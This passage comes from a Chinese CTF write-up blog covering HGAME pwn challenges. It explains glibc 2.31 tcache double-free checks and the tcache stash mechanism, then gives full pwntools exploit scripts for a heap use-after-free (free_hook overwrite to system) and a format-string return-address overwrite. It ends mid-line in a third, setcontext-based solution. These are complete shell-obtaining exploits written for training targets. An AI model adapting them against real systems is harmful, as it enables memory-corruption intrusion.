class="number">0x1ECB80</span></span><br></pre></td></tr></table></figure><p><em>接下来我们的思路要放在如何篡改free_hook来获取shell</em></p><p><em>没有edit函数的情况下 又有UAF 我们很容易想到的是利用double free来做到任意地址写</em></p><p><em>但是2.31的版本 glibc对于double free的检查机制更加严格了</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>  <span class="comment">//链表指针，对应chunk中的fd字段</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>  <span class="comment">//指向所属的tcache结构体，对应chunk中的bk字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p><em>对于每一个tcache都有一个key指针指向</em></p><p><em>借助这个key指针 plmalloc可以更好的对double free进行检查</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx(size);<span class="comment">//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查</span></span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">      tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="comment">//汇报错误信息</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">        <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">          <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">//通过检查，放入tcahce中</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put(p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><em>所以 如果我们还想要使用tcache double free的话 就只能修改key字段 或者是fastbin double free</em></p><p><em>但是由于fastbin对于chunk的取出有着size域的检查 相对来说不好办 但是在2.27.9版本以后 tcache新增了stash机制</em></p><p><em>要想明白这个机制的用处 我们先要清楚tcachebin的设计目的是什么</em></p><p><em>在多线程的情况下 plmalloc会遇到主分配区被抢占的问题 只能等待或者是申请一个非主分配区</em></p><p><em>针对这种情况 plmalloc为每个线程都涉及一个缓冲区 即tcache</em></p><p><em>而stash机制就是 如果用户申请一个0x60大小的chunk tcache里面没有的话 就会进入分配区处理</em></p><p><em>如果在fastbin中找到可以被申请的0x60chunk 系统就会认为将来还需要0x60大小的chunk 就会将fastbin中相同大小的chunk全部放入tcachebin中</em></p><p><em>因此我们利用这个手法就可以实现 在fastbin中实现double free 而在tcache中进行任意地址chunk的申请</em></p><p><em>完整exp:</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">32435</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)   //chunk0-chunk6用来填满tcache chunk7用来泄露基址</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  //填满tcache 从而使chunk8和chunk9可以被放入fastbin 之所以index和前面的垃圾chunk一样 是因为</span><br><span class="line">                         //程序对于delete函数进行了限制 只能释放index&lt;=<span class="number">0xf</span>的chunk</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = main_arena-<span class="number">96</span>-<span class="number">0x1ECB80</span></span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)          //将原本的tcache <span class="number">0x40</span>的链表全部的chunk申请 使其为空 触发stash机制</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xe3b01</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x30</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a><em>YukkuriSay</em></h3><p><em>非栈上格式化字符串漏洞题</em></p><p><em>checksec 查看一下保护机制发现还有canary机制</em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3ff000)</span><br><span class="line">    RUNPATH:  &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27;</span><br></pre></td></tr></table></figure><p><em>由于本人没有安装libc2.31以上版本的ubuntu 所以本地和远程的环境不一样</em></p><p><em>这里采用xclibc脚本更换二进制文件所依赖的libc</em></p><p><em><a href="https://github.com/ef4tless/xclibc">GitHub - ef4tless&#x2F;xclibc: A tool to change the libc environment of running files(一个在CTF比赛中用于切换题目运行libc环境的工具)</a></em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xclibc -x pwn libc-2.31.so</span><br></pre></td></tr></table></figure><p><em>再来看一下ida反编译出来的伪代码</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">4</span>]; <span class="comment">// [rsp+Ch] [rbp-114h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What would you like to let Yukkri say?&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( buf[v1 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">      buf[v1 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    print_str(buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;anything else?(Y/n)&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%2s&quot;</span>, s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;n&quot;</span>) &amp;&amp; <span class="built_in">strcmp</span>(s1, <span class="string">&quot;N&quot;</span>) );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yukkri prepared a gift for you: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, str, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(str);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>跟进一下print_str函数</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">print_str</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> l; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *j; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s&quot;</span>, <span class="number">51</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">51</span>; ++i )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n%*s/ %*s \\\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( j = a1; j &lt; &amp;a1[v8]; j += <span class="number">50</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%*s| %-50.50s |\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, j);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s\\___  &quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">46</span>; ++k )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s&quot;</span>, <span class="number">51</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= v8 + <span class="number">1</span>; ++l )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n%*s/ %*s \\\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, v8, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s| %s |\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, a1);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s\\___  &quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; v8 - <span class="number">3</span>; ++m )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*s&quot;</span>, <span class="number">51</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">21</span>; ++n )</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%*s/ %*s \\\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, <span class="number">20</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;%*s| %*s%s%*s |\n&quot;</span>,</span><br><span class="line">      <span class="number">50</span>,</span><br><span class="line">      (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008,</span><br><span class="line">      (<span class="number">20</span> - v8) / <span class="number">2</span> + v8 % <span class="number">2</span>,</span><br><span class="line">      (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008,</span><br><span class="line">      a1,</span><br><span class="line">      (<span class="number">20</span> - v8) / <span class="number">2</span>,</span><br><span class="line">      (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*s\\___  &quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">    <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">16</span>; ++ii )</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%*s|/\n&quot;</span>, <span class="number">54</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, yukkuri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>直接看不好看懂 直接运行一下脚本 发现是一个图形</em></p><p><em><a href="https://pic.imgdb.cn/item/63d4aa05face21e9ef61cd53.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d4aa05face21e9ef61cd53.png"></a></em></p><p>分析一下题目给我们的机会 首先是可以无限循环对栈上数据0x100字节大小的修改 并且还可以泄露栈上的数据</p><p>然后还有一次非栈上格式化字符串漏洞的机会</p><p>这题要想获取shell 只能通过覆盖ret addr 但是由于开启了canary 常规的栈溢出行不通 write泄露的栈内容长度又够不到canary</p><p>那么只能想办法通过非栈上格式化字符串漏洞来任意写到栈上的ret addr 使其为onegadget 这样就可以成功获取shell</p><p>那么我们就需要泄露栈地址和libc基址</p><p>gdb动调看一下</p><p><a href="https://pic.imgdb.cn/item/63d4da65face21e9efd28410.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d4da65face21e9efd28410.png"></a></p><p>当我们输入的payload大于0x50字节的时候 断点打在0x4014EF处 我们发现payload&#x3D; cyclic(0x100)时</p><p>可以泄露出栈上的地址 当我们输入的payload &#x3D; cyclic(0x98)时 可以泄露出stderr的真实地址</p><p><a href="https://pic.imgdb.cn/item/63d4db70face21e9efd50f29.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d4db70face21e9efd50f29.png"></a></p><p>我们成功获得了栈地址和libc基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">splitaddr</span>(<span class="params">target_addr</span>):</span><br><span class="line">    addr = []</span><br><span class="line">    curr = <span class="number">0</span>          </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        num = target_addr % <span class="number">65536</span></span><br><span class="line">        tmp = (num - curr + <span class="number">65536</span>) % <span class="number">65536</span></span><br><span class="line">        addr.append(tmp)</span><br><span class="line">        curr = (curr + tmp) % <span class="number">65536</span></span><br><span class="line">        target_addr = target_addr &gt;&gt; <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc =ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What would you like to let Yukkri say?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x98</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = addr - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x100</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x8</span></span><br><span class="line">success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br></pre></td></tr></table></figure><p>首先由于非栈上格式化字符串并没有办法直接对栈数据更改 所以我们还需要先修改栈上的数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(stack_addr)</span><br><span class="line">payload += p64(stack_addr+<span class="number">2</span>)</span><br><span class="line">payload += p64(stack_addr+<span class="number">4</span>)</span><br><span class="line">payload += p64(stack_addr+<span class="number">6</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>非栈上格式化字符串会在栈专题中讲 所以这里就不解释为什么这么写了</p><p>最后的关键在于说ret addr的地址是在哪里 我们上面动调也可以看到 是位于stack_addr-0x8处 所以这里任意写其内容为onegadget</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">splitaddr</span>(<span class="params">target_addr</span>):</span><br><span class="line">    addr = []</span><br><span class="line">    curr = <span class="number">0</span>          </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        num = target_addr % <span class="number">65536</span></span><br><span class="line">        tmp = (num - curr + <span class="number">65536</span>) % <span class="number">65536</span></span><br><span class="line">        addr.append(tmp)</span><br><span class="line">        curr = (curr + tmp) % <span class="number">65536</span></span><br><span class="line">        target_addr = target_addr &gt;&gt; <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc =ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What would you like to let Yukkri say?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x98</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = addr - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x100</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x8</span></span><br><span class="line">success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">payload = p64(stack_addr)</span><br><span class="line">payload += p64(stack_addr+<span class="number">2</span>)</span><br><span class="line">payload += p64(stack_addr+<span class="number">4</span>)</span><br><span class="line">payload += p64(stack_addr+<span class="number">6</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">onegadget_addr = <span class="number">0xe3b01</span>+libc_addr</span><br><span class="line">addr = splitaddr(onegadget_addr)</span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addr[<span class="number">0</span>]).encode() + <span class="string">b&quot;lx%8$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addr[<span class="number">1</span>]).encode() + <span class="string">b&quot;lx%9$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addr[<span class="number">2</span>]).encode() + <span class="string">b&quot;lx%10$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addr[<span class="number">3</span>]).encode() + <span class="string">b&quot;lx%11$hn&quot;</span></span><br><span class="line">io.send(payload+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="note-context"><a href="#note-context" class="headerlink" title="note_context"></a>note_context</h3><p>这题是赛后复现的 学到挺多东西 顺便巩固了setcontext的利用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201919627.png" title="image-20230320191900517" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201919627.png" alt="image-20230320191900517"></a></p><p>保护全开 环境是2.32</p><p>并且开启了沙盒</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201925615.png" title="image-20230320192512541" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201925615.png" alt="image-20230320192512541"></a></p><p>经典菜单题 伪代码这里就不放了 一共给了四个函数</p><p>add函数可以申请chunk 大小限制在0x500-0x900</p><p>delete函数没有置零堆块指针 存在UAF</p><p>show函数可以打印堆块内容 </p><p>edit函数不存在堆溢出 根据最开始申请chunk时输入的size</p><p>由于对申请chunk的限制 一开始我们能考虑的只有unsortedbin attack 和 largebin attack</p><p>但是前者相对鸡肋 需要我们对任意申请地址已经有edit能力 后者也只能做到任意地址写堆地址</p><p>house of storm需要最后申请的chunk大小符合0x50链表 所以也没有办法</p><p>那么我们需要另寻出路 覆盖mp_.tcache_bins来使得size较大的chunk也能被释放到tcachebin中 从而可以打tcachebin attack 任意地址写</p><p>这里采用largebin attack任意写的那一套</p><p>我们先泄露基址 注意一下末尾00 需要覆盖一下 否则puts无法泄露</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x800</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x7f0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1</span>-<span class="number">96</span></span><br><span class="line">libc_addr = main_arena_addr - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + 